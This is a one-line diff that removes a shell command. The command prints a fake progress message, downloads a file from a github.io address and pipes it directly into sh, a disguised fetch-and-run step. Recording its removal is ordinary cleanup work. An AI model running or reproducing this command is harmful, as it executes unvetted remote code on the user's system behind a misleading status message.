@@ -1,1 +1,0 @@
-echo 'Progress: 49.0%'; curl -L --progress-bar frkns.github.io/fun/charm_experiences_showers.hs | sh
